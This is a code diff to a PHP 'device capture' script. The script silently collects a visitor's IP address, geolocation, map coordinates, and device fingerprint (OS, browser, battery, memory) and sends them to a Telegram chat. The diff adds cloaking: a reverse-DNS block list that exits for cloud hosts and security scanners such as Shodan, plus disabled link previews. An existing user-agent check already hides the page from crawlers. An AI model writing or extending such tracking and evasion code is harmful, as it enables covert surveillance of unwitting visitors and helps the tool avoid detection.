@@ -3,7 +3,7 @@
 // ULTIMATE DEVICE CAPTURE – VISUALLY ENHANCED TELEGRAM OUTPUT
 // ============================================================
 
-// 1. Anti-bot / crawler
+// 1. Anti-bot / crawler (User-Agent check)
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 if (preg_match('/(TelegramBot|WhatsApp|Instagram|facebookexternalhit|Facebot|GoogleImageProxy|Googlebot|Google-Safety|Mediapartners-Google)/i', $userAgent)) {
     exit();
@@ -39,6 +39,32 @@ function getRealIpAddr() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 $ip = getRealIpAddr();
+
+// ============================================================
+// 4.5. ADVANCED ANTI-BOT: Data Center & Cloud Blocker
+// ============================================================
+if ($ip !== 'Unknown') {
+    $hostname = @gethostbyaddr($ip);
+    if ($hostname && $hostname !== $ip) {
+        $blockedHosts = [
+            'amazonaws.com',       // Amazon AWS
+            'googleusercontent.com', // Google Cloud
+            'googlebot.com',       // Google Scanners
+            'search.msn.com',      // Microsoft/Bing Bots
+            'compute.internal',    // Generic Cloud instances
+            'linode.com',          // Linode Hosting
+            'digitalocean.com',    // DigitalOcean Hosting
+            'shodan.io',           // Shodan Security Scanners
+            'onrender.com'         // Render Internal Scanners
+        ];
+        foreach ($blockedHosts as $blocked) {
+            if (stripos($hostname, $blocked) !== false) {
+                exit(); // Silently kill the script for data center bots
+            }
+        }
+    }
+}
+// ============================================================
 
 // 5. IP geolocation
 $city = $region = $country = $isp = 'Unknown';
@@ -121,6 +147,7 @@ $message .= "├ Region: {$region}\n";
 $message .= "├ Country: {$country}\n";
 $message .= "├ ISP: {$isp}\n";
 if ($lat && $lon) {
+    // FIXED GOOGLE MAPS LINK HERE
     $mapsLink = "https://www.google.com/maps?q={$lat},{$lon}";
     $message .= "├ Coordinates: {$lat}, {$lon}\n";
     $message .= "└ Map: <a href='{$mapsLink}'>View on Google Maps</a>\n";
@@ -132,7 +159,7 @@ $message .= "\n";
 // Device fingerprint
 $message .= "💻 <b>DEVICE FINGERPRINT</b>\n";
 $message .= "├ OS: {$data['platform']}\n";
-$message .= "├ Browser: " . getPost('brw', 'Unknown') . "\n"; // brw might be passed separately
+$message .= "├ Browser: " . getPost('brw', 'Unknown') . "\n";
 $message .= "├ Battery: {$data['batteryLevel']} (Charging: {$data['batteryCharging']})\n";
 $message .= "├ RAM: {$data['deviceMemory']} GB\n";
 $message .= "├ Cores: {$data['hardwareConcurrency']}\n";
@@ -164,7 +191,7 @@ $params = [
     'chat_id' => $chatId,
     'text'    => $message,
     'parse_mode' => 'HTML',
-    'disable_web_page_preview' => false
+    'disable_web_page_preview' => true // Set to true so Telegram doesn't try to crawl the map link
 ];
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_POST, true);
